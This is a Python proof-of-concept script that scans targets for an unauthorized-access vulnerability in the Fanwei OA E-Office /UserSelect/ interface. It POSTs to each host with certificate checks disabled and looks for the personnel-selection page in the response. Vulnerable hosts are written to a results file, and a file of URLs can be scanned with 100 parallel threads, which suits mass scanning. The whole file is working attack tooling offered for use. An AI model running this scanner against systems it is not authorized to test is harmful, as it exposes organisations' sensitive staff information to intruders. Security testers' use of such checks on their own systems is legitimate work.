#-*- coding: utf-8 -*-
import argparse,sys,requests
import base64
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    test = """

                    ___       __   __    __  ___  __      __   ___     ___                 ___   
|  | |\ |  /\  |  |  |  |__| /  \ |__) |  / |__  |  \    /  \ |__     |__   /\  |\ | |  | |__  | 
\__/ | \| /~~\ \__/  |  |  | \__/ |  \ | /_ |___ |__/    \__/ |       |    /~~\ | \| |/\| |___ | 
                                                                                                 
                                                                                          
                                       tag:  FANWEI-OA-UnAuthorized                                    
                                       @version: 1.0.0   @author: Despacito096           
"""
    print(test)

def poc(target):
    url = target+"/UserSelect/"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 Edg/116.0.1938.54",
    }
    try:
        res = requests.post(url,headers=headers,timeout=5,verify=False).text
        # print(res)
        if "选择人员" in res:
            print(f"[+] {target} exists unauthorized")
            with open("result1.txt", "a+", encoding="utf-8") as f:
                f.write(target+"\n")
                return True
        else:
            print(f"[-] {target} is doesn't exist unauthorized")
            return False
    except:
        print(f"[!]{target} access error!")
        return False

def main():
    banner()
    parser = argparse.ArgumentParser(
        description='The Fanwei OA E-Office UserSelect interface has an unauthorized access vulnerability, through which an attacker can obtain sensitive information')
    parser.add_argument("-u", "--url", dest="url", type=str,
                        help=" example: http://www.example.com,USED FOR SINGLE TEST")
    parser.add_argument("-f", "--file", dest="file", type=str, help=" urls.txt  USED FOR ABUNDANT TESTS")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file, "r", encoding="utf-8") as f:
            for url in f.readlines():
                url_list.append(url.strip().replace("\n", ""))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

if __name__ == '__main__':
    main()